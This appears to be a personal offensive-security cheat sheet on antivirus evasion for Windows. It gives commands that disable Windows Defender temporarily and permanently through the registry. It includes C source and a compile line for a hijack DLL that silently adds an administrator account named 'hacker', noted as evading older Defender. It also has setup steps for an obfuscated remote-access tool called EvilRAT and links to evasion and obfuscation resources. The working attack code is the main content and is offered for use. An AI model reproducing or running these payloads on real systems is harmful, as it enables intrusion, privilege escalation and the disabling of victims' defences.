## AV Evasion

1. Use batch files to call things like netcat
2. Encoding payloads
3. 

## Disable Windows Defender from CLI

```powershell
# One-Time
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
# Enable
Set-MpPreference -DisableRealtimeMonitoring $false

## Permanent Disable
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1

## Permanent Enable
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
```

### DLLs

DLL Hijacking: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking

The code below currently does not get detected by older Windows Defender, but you can swap the user creation commands with an obfuscated PS command and it works.

```c
#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd.exe /c net user hacker hacked /add");
    system("cmd.exe /c net localgroup administrators hacker /add");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Saved as `adduser.c`

Compile: `x86_64-w64-mingw32-gcc adduser.c -shared -o adduser.dll`

### PowerShell Obfuscation

This script worked on 1/29/2023 Windows Defender Defs:  https://github.com/pr0xy-8L4d3/EvilRAT

```bash
git clone https://github.com/pr0xy-8L4d3/EvilRAT.git
cd EvilRat
chmod 744 install.sh EvilRat.sh
./install.sh
./EvilRat.sh
#Follow instructions...
```

You can insert this command into the DLL above instead of creating users.

## Other Links

- This one actually looks promising 
  - https://github.com/danielbohannon/Invoke-Obfuscation
  - https://www.mike-gualtieri.com/posts/modifying-empire-to-evade-windows-defender

https://medium.com/@sudoleox/how-i-am-winning-battle-with-windows-10-and-11-security-and-avoiding-detection-6ea9f954b2a7

https://github.com/Karmaz95/evasion

https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads/blob/main/Bypass-AV-Payload-Detection.MD

https://www.cynet.com/attack-techniques-hands-on/powershell-obfuscation-demystified-series-chapter-1-intro/#:~:text=The%20most%20common%20PowerShell%20obfuscation,%E2%80%9C%2B%E2%80%9D%20operator%20for%20example.&text=Reordering%E2%80%93%20formatting%20operator%20

https://github.com/danielbohannon/Invoke-Obfuscation

